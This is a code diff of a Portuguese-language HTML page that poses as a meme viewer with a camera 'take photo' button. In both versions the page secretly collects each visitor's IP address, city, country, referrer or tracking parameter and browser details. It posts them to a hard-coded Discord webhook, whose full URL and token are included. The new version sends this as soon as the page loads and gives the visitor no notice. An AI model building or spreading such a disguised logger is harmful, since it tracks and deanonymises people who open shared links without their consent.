@@ -1,184 +1,91 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>View Meme</title>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width,initial-scale=1.0"/>
+  <title>Visualizar Meme</title>
   <style>
-    body {
-      margin: 0;
-      padding: 20px;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: flex-start;
-      min-height: 100vh;
-      background-color: #f7f7f7;
-      font-family: Arial, sans-serif;
-      text-align: center;
+    body { font-family:sans-serif; text-align:center; padding:20px; background:#f4f4f4; }
+    #memeArea img, #memeArea video { max-width:100%; margin:20px auto; display:block; }
+    .btn-capture { 
+      background:#007bff; color:#fff; border:none; padding:10px 20px; 
+      border-radius:5px; cursor:pointer; font-size:16px; 
     }
-    #meme-container {
-      margin: 20px 0;
-    }
-    #meme-container img, 
-    #meme-container video {
-      max-width: 90vw;
-      height: auto;
-      border: 1px solid #ccc;
-      border-radius: 8px;
-    }
-    #photo-button {
-      padding: 10px 20px;
-      font-size: 1rem;
-      cursor: pointer;
-      border: none;
-      background-color: #3498db;
-      color: white;
-      border-radius: 5px;
-      display: none;
-    }
-    #snapshot {
-      margin-top: 20px;
-      max-width: 90vw;
-      height: auto;
-      border: 1px solid #ccc;
-      border-radius: 8px;
-      display: none;
-    }
+    #photoPreview { margin-top:20px; max-width:100%; }
   </style>
 </head>
 <body>
-
-  <div id="meme-container"></div>
-  <button id="photo-button">Tirar Foto</button>
-  <img id="snapshot" alt="Foto tirada do visitante">
-  <!-- Hidden video element for capturing the camera stream -->
-  <video id="video" autoplay playsinline style="display:none;"></video>
+  <h2>Meme Visualizado</h2>
+  <div id="memeArea">Carregando meme…</div>
+  <button id="captureBtn" class="btn-capture" style="display:none;">🤳 Tirar Foto</button>
+  <div id="photoPreview"></div>
+  <p id="info" style="margin-top:20px; font-size:14px;">Carregando localização…</p>
 
   <script>
-  document.addEventListener('DOMContentLoaded', function() {
+    // debug
     const params = new URLSearchParams(window.location.search);
-    const memeId = params.get('meme');
-    const memeContainer = document.getElementById('meme-container');
-    const photoButton = document.getElementById('photo-button');
-    const snapshot = document.getElementById('snapshot');
-    const video = document.getElementById('video');
+    console.log("URL params:", window.location.search, Object.fromEntries(params.entries()));
+    const meme = params.get("meme");
+    const ref  = params.get("ref");
 
-    // Carregar o meme correspondente
-    if (memeId === 'meme1') {
-      const img = document.createElement('img');
-      img.src = 'https://via.placeholder.com/300x200.png?text=Meme+1';
-      img.alt = 'Meme 1';
-      img.onload = function() {
-        photoButton.style.display = 'inline-block';
-      };
-      memeContainer.appendChild(img);
-    } else if (memeId === 'meme2') {
-      const vid = document.createElement('video');
-      vid.src = 'https://www.w3schools.com/html/mov_bbb.mp4';
-      vid.controls = true;
-      vid.onloadeddata = function() {
-        photoButton.style.display = 'inline-block';
-      };
-      memeContainer.appendChild(vid);
-    } else {
-      memeContainer.innerText = 'Meme inválido.';
-      return;
+    // função de exibição
+    function showMeme(id) {
+      const area = document.getElementById("memeArea");
+      if (id === "meme1") {
+        area.innerHTML = '<img src="https://via.placeholder.com/300x200.png?text=Meme+1" alt>';
+      } else if (id === "meme2") {
+        area.innerHTML = '<video controls><source src="https://www.w3schools.com/html/mov_bbb.mp4"></video>';
+      } else {
+        area.innerText = "Meme não encontrado";
+        return false;
+      }
+      return true;
     }
 
-    // Evento do botão "Tirar Foto"
-    photoButton.addEventListener('click', async function() {
-      if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-        try {
-          const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    // captura de foto via botão
+    function capturePhoto() {
+      const preview = document.getElementById("photoPreview");
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => {
+          const video = document.createElement("video");
           video.srcObject = stream;
           video.play();
-          video.onloadeddata = function() {
-            const canvas = document.createElement('canvas');
+          // quando o vídeo está pronto, capturamos um frame
+          video.onloadeddata = () => {
+            const canvas = document.createElement("canvas");
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            // Parar a câmera
-            stream.getTracks().forEach(track => track.stop());
-            // Exibir a foto tirada
-            snapshot.src = canvas.toDataURL('image/png');
-            snapshot.style.display = 'block';
-            // Enviar dados para o webhook do Discord
-            sendData(memeId);
+            canvas.getContext("2d").drawImage(video, 0, 0);
+            const img = new Image();
+            img.id = "photoPreview";
+            img.src = canvas.toDataURL("image/png");
+            preview.replaceWith(img);
+            stream.getTracks().forEach(t => t.stop());
           };
-        } catch (err) {
-          console.error('Erro ao acessar a câmera:', err);
-        }
-      } else {
-        alert('Este navegador não suporta câmera via getUserMedia.');
-      }
-    });
-
-    // Função para detectar dispositivo e enviar dados para o Discord
-    async function sendData(memeId) {
-      const referer = document.referrer || 'N/A';
-      let ip = 'Desconhecido', city = 'Desconhecida', country = 'Desconhecido';
-      try {
-        const res = await fetch('https://ipapi.co/json/');
-        const data = await res.json();
-        ip = data.ip;
-        city = data.city;
-        country = data.country_name;
-      } catch (e) {
-        console.error('Erro ao obter dados de localização:', e);
-      }
-      // Detecção de sistema operacional
-      const ua = navigator.userAgent;
-      let os = 'Desconhecido';
-      if (/windows phone/i.test(ua)) {
-        os = 'Windows Phone';
-      } else if (/win/i.test(ua)) {
-        os = 'Windows';
-      } else if (/android/i.test(ua)) {
-        os = 'Android';
-      } else if (/iPad|iPhone|iPod/.test(ua) && !/Windows/.test(ua)) {
-        os = 'iOS';
-      } else if (/Mac/i.test(ua)) {
-        os = 'macOS';
-      } else if (/Linux/i.test(ua)) {
-        os = 'Linux';
-      }
-      // Detecção de navegador
-      let browser = 'Desconhecido';
-      if (/Edg\//.test(ua)) {
-        browser = 'Edge';
-      } else if (/OPR\//.test(ua)) {
-        browser = 'Opera';
-      } else if (/Chrome\//.test(ua) && !/Edg\//.test(ua)) {
-        browser = 'Chrome';
-      } else if (/Safari\//.test(ua) && !/Chrome\//.test(ua)) {
-        browser = 'Safari';
-      } else if (/Firefox\//.test(ua)) {
-        browser = 'Firefox';
-      }
-      const deviceInfo = `${os} - ${browser}`;
-
-      const content = 
-        `Meme ID: ${memeId}\n` +
-        `Referência: ${referer}\n` +
-        `IP: ${ip}\n` +
-        `Localização: ${city}, ${country}\n` +
-        `Dispositivo: ${deviceInfo}`;
-
-      try {
-        await fetch('https://discord.com/api/webhooks/1371164024217272490/oy4D3DFmXtlobnD2QYi11LU_izNCXp5NmYPMCMmiP1Q28XrvC6UCMCiiRzTfQM_iMpb3', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ content: content })
-        });
-      } catch (e) {
-        console.error('Erro ao enviar dados para o Discord:', e);
-      }
+        })
+        .catch(() => preview.innerText = "Permissão de câmera negada.");
     }
-  });
-  </script>
 
+    // carregar local e enviar Discord
+    fetch("https://ipapi.co/json")
+      .then(r => r.json())
+      .then(data => {
+        document.getElementById("info").innerHTML = 
+          `Meme: ${meme}<br>Ref: ${ref}<br>IP: ${data.ip}<br>Local: ${data.city}, ${data.country_name}`;
+        fetch("https://discord.com/api/webhooks/1371164024217272490/oy4D3DFmXtlobnD2QYi11LU_izNCXp5NmYPMCMmiP1Q28XrvC6UCMCiiRzTfQM_iMpb3", {
+          method:"POST", headers:{"Content-Type":"application/json"},
+          body: JSON.stringify({ content:
+            `👀 Meme: ${meme}\nRef: ${ref}\nIP: ${data.ip}\nLocal: ${data.city}, ${data.country_name}\nAgent: ${navigator.userAgent}` 
+          })
+        });
+      });
+
+    // execução principal
+    if (showMeme(meme)) {
+      const btn = document.getElementById("captureBtn");
+      btn.style.display = "inline-block";
+      btn.onclick = capturePhoto;
+    }
+  </script>
 </body>
 </html>
-
